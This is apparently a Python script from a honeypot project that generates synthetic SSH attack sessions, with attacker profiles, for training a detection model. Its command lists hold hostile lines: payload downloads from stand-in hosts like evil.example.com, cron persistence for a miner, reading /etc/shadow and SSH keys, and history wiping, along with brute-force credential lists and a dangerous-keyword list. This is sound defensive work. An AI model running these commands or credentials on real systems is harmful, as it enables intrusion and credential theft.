"""
LLMPot — Synthetic Dataset Generator
Generates realistic synthetic attack sessions for initial ML training.
"""

import random
import sys
import uuid
from datetime import datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from database.db_manager import DatabaseManager
from utils.logger import get_logger

logger = get_logger("datagen")

# ─── Attacker Profiles ────────────────────────────────────────────────────────

PROFILES = {
    "scout": {
        "description": "Quick recon — checks system info and leaves",
        "weight": 0.35,
        "duration_range": (5, 60),
        "cmd_count_range": (2, 8),
        "commands": [
            "uname -a", "whoami", "id", "hostname", "cat /etc/os-release",
            "uptime", "df -h", "free -m", "w", "ps aux",
            "cat /proc/cpuinfo", "cat /proc/meminfo", "ls -la",
            "pwd", "ls /tmp", "ifconfig", "ip addr",
        ],
        "passwords": [
            "root", "admin", "123456", "password", "test",
            "toor", "qwerty", "guest",
        ],
        "usernames": ["root", "admin", "test"],
        "countries": [
            ("China", "CN", 30.0, 104.0),
            ("Russia", "RU", 55.7, 37.6),
            ("United States", "US", 40.7, -74.0),
            ("Brazil", "BR", -23.5, -46.6),
            ("India", "IN", 28.6, 77.2),
        ],
    },
    "brute_forcer": {
        "description": "Tries many credential combos, no interactive session",
        "weight": 0.30,
        "duration_range": (1, 10),
        "cmd_count_range": (0, 2),
        "commands": ["exit", "whoami", "id"],
        "passwords": [
            "123456", "password", "admin", "root", "12345678",
            "qwerty", "abc123", "monkey", "master", "dragon",
            "login", "princess", "football", "shadow", "sunshine",
            "trustno1", "iloveyou", "batman", "letmein", "111111",
            "access", "hello", "charlie", "welcome1", "pass123",
        ],
        "usernames": [
            "root", "admin", "user", "test", "oracle", "ubuntu",
            "postgres", "mysql", "ftp", "www", "pi", "guest",
            "administrator", "deploy", "git", "jenkins", "ansible",
        ],
        "countries": [
            ("China", "CN", 39.9, 116.4),
            ("Vietnam", "VN", 21.0, 105.8),
            ("South Korea", "KR", 37.5, 127.0),
            ("Netherlands", "NL", 52.4, 4.9),
            ("Germany", "DE", 52.5, 13.4),
        ],
    },
    "malware_dropper": {
        "description": "Downloads and executes malware",
        "weight": 0.20,
        "duration_range": (30, 300),
        "cmd_count_range": (5, 20),
        "commands": [
            "uname -a", "whoami", "id",
            "cd /tmp", "pwd",
            "wget http://malicious-server.example.com/payload.sh",
            "curl -O http://evil.example.com/miner.sh",
            "chmod +x payload.sh", "chmod 777 miner.sh",
            "./payload.sh", "./miner.sh",
            "nohup ./miner.sh &",
            "wget http://bad.example.com/bot.bin",
            "chmod +x bot.bin",
            "crontab -e",
            "echo '*/5 * * * * /tmp/miner.sh' >> /etc/crontab",
            "cat /etc/passwd", "cat /etc/shadow",
            "history -c",
            "rm -rf /tmp/*.sh",
        ],
        "passwords": ["root", "toor", "admin123", "password1", "pass"],
        "usernames": ["root", "admin"],
        "countries": [
            ("Russia", "RU", 59.9, 30.3),
            ("Ukraine", "UA", 50.4, 30.5),
            ("Romania", "RO", 44.4, 26.1),
            ("China", "CN", 23.1, 113.3),
            ("Iran", "IR", 35.7, 51.4),
        ],
    },
    "data_exfiltrator": {
        "description": "Attempts to steal sensitive data",
        "weight": 0.15,
        "duration_range": (60, 600),
        "cmd_count_range": (10, 30),
        "commands": [
            "uname -a", "whoami", "id",
            "cat /etc/passwd", "cat /etc/shadow", "cat /etc/group",
            "cat /etc/ssh/sshd_config",
            "ls -la /root", "ls -la /root/.ssh",
            "cat /root/.ssh/authorized_keys",
            "cat /root/.bash_history",
            "ls -la /home", "ls -la /home/admin",
            "cat /home/admin/.bash_history",
            "cat /home/admin/scripts/backup.sh",
            "find / -name '*.conf' -type f",
            "find / -name '*.key' -type f",
            "find / -name '*.pem' -type f",
            "cat /etc/resolv.conf",
            "cat /etc/hosts",
            "netstat -tlnp", "ss -tlnp",
            "ps aux", "crontab -l",
            "df -h", "mount",
            "cat /var/log/auth.log",
            "history",
        ],
        "passwords": ["root", "admin", "password", "p@ssw0rd"],
        "usernames": ["root", "admin"],
        "countries": [
            ("China", "CN", 31.2, 121.5),
            ("North Korea", "KP", 39.0, 125.7),
            ("Russia", "RU", 55.7, 37.6),
            ("Iran", "IR", 35.7, 51.4),
            ("Pakistan", "PK", 33.7, 73.0),
        ],
    },
}


def generate_synthetic_dataset(num_sessions: int = 1000,
                               db_path: str = None) -> int:
    """
    Generate synthetic attack sessions and populate the database.
    
    Returns count of sessions generated.
    """
    if db_path:
        db = DatabaseManager(db_path)
    else:
        db = DatabaseManager()

    generated = 0
    base_time = datetime.utcnow() - timedelta(days=30)

    # Build weighted profile list
    profile_names = []
    profile_weights = []
    for name, profile in PROFILES.items():
        profile_names.append(name)
        profile_weights.append(profile["weight"])

    logger.info(f"Generating {num_sessions} synthetic sessions...")

    for i in range(num_sessions):
        # Pick a profile
        profile_name = random.choices(profile_names, weights=profile_weights, k=1)[0]
        profile = PROFILES[profile_name]

        session_id = str(uuid.uuid4())
        country_data = random.choice(profile["countries"])
        country, country_code, base_lat, base_lon = country_data

        # Jitter the coordinates
        lat = base_lat + random.uniform(-5.0, 5.0)
        lon = base_lon + random.uniform(-5.0, 5.0)

        # Generate fake IP
        ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

        username = random.choice(profile["usernames"])
        password = random.choice(profile["passwords"])

        duration = random.uniform(*profile["duration_range"])
        cmd_count = random.randint(*profile["cmd_count_range"])

        # Session timestamp
        session_time = base_time + timedelta(
            seconds=random.randint(0, 30 * 86400)
        )

        # Create session
        db.create_session(
            session_id=session_id,
            attacker_ip=ip,
            attacker_port=random.randint(40000, 65000),
            username=username,
            password=password,
            auth_success=True,
            geo_data={
                "country": country,
                "countryCode": country_code,
                "city": f"City-{random.randint(1, 100)}",
                "regionName": f"Region-{random.randint(1, 20)}",
                "lat": lat,
                "lon": lon,
                "isp": f"ISP-{random.randint(1, 50)}",
                "org": f"Org-{random.randint(1, 30)}",
                "as": f"AS{random.randint(1000, 99999)}",
            },
        )

        # Generate commands
        if cmd_count > 0:
            selected_cmds = random.sample(
                profile["commands"],
                min(cmd_count, len(profile["commands"]))
            )
            for cmd in selected_cmds:
                is_dangerous = any(kw in cmd for kw in [
                    "wget", "curl", "chmod", "rm -rf", "cat /etc/shadow",
                    "crontab", "useradd", "./", "nohup", "dd ", "mkfs"
                ])
                category = None
                if "wget" in cmd or "curl" in cmd:
                    category = "malware_download"
                elif "chmod" in cmd or "crontab" in cmd:
                    category = "persistence"
                elif "rm -rf" in cmd:
                    category = "destruction"
                elif "cat /etc" in cmd or "find" in cmd:
                    category = "reconnaissance"

                db.log_command(
                    session_id=session_id,
                    command=cmd,
                    output="",
                    is_dangerous=is_dangerous,
                    threat_category=category,
                )

        # End session
        db.end_session(session_id, cmd_count)

        # Also create auth attempts
        # Brute forcers get extra failed attempts before success
        if profile_name == "brute_forcer":
            num_fails = random.randint(5, 50)
            for _ in range(num_fails):
                db.log_auth_attempt(
                    attacker_ip=ip,
                    attacker_port=random.randint(40000, 65000),
                    username=random.choice(profile["usernames"]),
                    password=random.choice(profile["passwords"]),
                    success=False,
                    session_id=session_id,
                )

        db.log_auth_attempt(
            attacker_ip=ip,
            attacker_port=random.randint(40000, 65000),
            username=username,
            password=password,
            success=True,
            session_id=session_id,
        )

        generated += 1

        if (i + 1) % 200 == 0:
            logger.info(f"  Generated {i + 1}/{num_sessions} sessions...")

    logger.info(f"✓ Generated {generated} synthetic sessions successfully")
    return generated


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Generate synthetic attack data")
    parser.add_argument("-n", "--num", type=int, default=1000,
                        help="Number of sessions to generate")
    args = parser.parse_args()
    generate_synthetic_dataset(args.num)
